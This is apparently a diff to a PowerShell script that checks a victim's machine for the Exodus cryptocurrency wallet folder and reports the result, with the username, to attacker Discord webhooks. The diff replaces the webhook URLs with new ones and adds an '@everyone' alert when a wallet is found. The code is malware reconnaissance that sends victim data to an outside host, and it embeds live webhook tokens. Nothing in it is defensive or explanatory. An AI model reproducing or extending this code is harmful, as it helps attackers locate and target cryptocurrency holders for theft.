@@ -1,5 +1,5 @@
-$discordHookFound = 'https://discord.com/api/webhooks/1439666084205822022/X6QeRBbzi6cCc-uIESH4b7kYa1FK7pKIejGSwki57HqIIksAuXPMzFE-cpXcq-XchXCm'
-$discordHookNotFound = 'https://discord.com/api/webhooks/1437121398605742204/A-T3rrS_fyvQxuIxjdfbwDUDOdMrrIqpsP6F9q8I1CDWA5U7DMOo_CvtsFQZCiimADZt'
+$discordHookFound = 'https://discord.com/api/webhooks/1442110295307714570/jR4k1jBkN4NjWdCmnWHaHAdNo4M0uD2-SIqaP1ynVwLB8dGNTEm9XJnPoSTpUT1i86de'
+$discordHookNotFound = 'https://discord.com/api/webhooks/1442110365943988296/G_owEIDLsodiOMraqtJdeyd1Pbq1565m8MRC_sNJ5OKgonwr_T8vPkAc5fp3Gq8806Va'
 $exodusDir = Join-Path $env:APPDATA 'Exodus'
 $avatarUrl = 'https://i.imgur.com/4NJG86V.png'
 $embedColor = 7224248
@@ -33,7 +33,7 @@ function Send-DiscordEmbed($hook, $title, $desc, $color, $thumb) {
 }
 
 if (Test-Path -Path $exodusDir) {
-    Send-DiscordEmbed $discordHookFound 'Exoduz found' "Found on $userName" $embedColor $avatarUrl
+    Send-DiscordEmbed $discordHookFound '@everyone Exoduz found' "Found on $userName" $embedColor $avatarUrl
 } else {
     Send-DiscordEmbed $discordHookNotFound 'Exoduz not found' "Not found on $userName" $embedColor $avatarUrl
 }
